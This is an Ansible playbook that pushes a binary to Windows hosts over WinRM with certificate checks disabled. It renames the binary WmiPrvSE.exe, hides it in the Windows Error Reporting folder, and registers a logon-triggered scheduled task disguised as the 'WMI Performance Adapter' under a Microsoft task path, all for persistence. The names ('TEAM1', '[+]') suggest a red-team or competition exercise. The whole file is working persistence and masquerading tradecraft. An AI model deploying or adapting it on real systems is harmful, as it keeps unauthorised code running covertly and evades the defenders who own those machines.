---
- name: Deploy and Create Persistent Task
  hosts: windows
  gather_facts: no
  vars:
    ansible_connection: winrm
    ansible_winrm_transport: ntlm
    ansible_winrm_server_cert_validation: ignore
    target_dir: 'C:\ProgramData\Microsoft\Windows\WER'

  tasks:
    - name: Ensure target directory exists
      ansible.windows.win_file:
        path: "{{ target_dir }}"
        state: directory

    - name: Drop the binary
      ansible.windows.win_copy:
        src: "files/proper.exe"
        dest: "{{ target_dir }}\\WmiPrvSE.exe"

    - name: Create and Start the persistent task
      ansible.windows.win_shell: |
        $Action = New-ScheduledTaskAction -Execute "{{ target_dir }}\WmiPrvSE.exe" -Argument "client"
        $Trigger = New-ScheduledTaskTrigger -AtLogOn -User "TEAM1\charliebrown"
        $Principal = New-ScheduledTaskPrincipal -UserId "TEAM1\charliebrown" -LogonType Interactive -RunLevel LeastPrivilege
        $TaskFolder = "\Microsoft\Windows\WMI\"

        if (-not (Test-Path "C:\Windows\System32\Tasks\Microsoft\Windows\WMI")) {
            New-Item -Path "C:\Windows\System32\Tasks\Microsoft\Windows\WMI" -ItemType Directory -Force | Out-Null
        }

        Register-ScheduledTask -TaskName "WMI Performance Adapter" -TaskPath $TaskFolder -Action $Action -Trigger $Trigger -Principal $Principal -Force

        Start-ScheduledTask -TaskName "WMI Performance Adapter" -TaskPath $TaskFolder

        Write-Host "[+] Task registered and started."
